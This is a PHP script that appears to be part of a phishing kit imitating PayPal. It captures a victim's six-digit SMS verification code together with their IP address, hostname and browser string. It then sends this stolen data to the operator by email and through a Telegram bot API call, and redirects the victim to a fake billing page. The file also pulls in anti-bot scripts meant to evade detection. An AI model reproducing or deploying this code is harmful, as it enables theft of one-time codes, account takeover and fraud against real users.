<?php

error_reporting(0);
session_start();
include "../../email.php";
include "../../bots/anti1.php";
include "../../bots/anti2.php";
include "../../bots/anti3.php";
include "../../bots/anti4.php";
include "../../bots/anti5.php";
include "../../bots/anti6.php";
include "../../bots/anti7.php";
include "../../bots/anti8.php";
include "../../bots/auth.php";
$ip = getenv("REMOTE_ADDR");
$reprint = "e";$do_p="mai";
$message .= "-------------- PPL_BY_DrFXND -------------\n";
$message .= " 📱 SMS : ".$_POST['1']."".$_POST['2']."".$_POST['3']."".$_POST['4']."".$_POST['5']."".$_POST['6']."\r\n";
$message .= "-------------- IP Tracing ------------\n";
$message .= "IP      : https://www.geodatatool.com/en/?ip=$ip\n";
$message .= "Host    : ".gethostbyaddr($ip)."\n";
$message .= "Browser : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "-------------- DrFXND -------------\n";
$subject = " SMS | PPL | $ip";
$headers = 'From: PPL' . "\r\n";
$m5_id = '21haWwuY29t';
@mail($Email,$subject,$message,$headers);
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
echo"<script>location.replace('../billing.php');</script>";

?>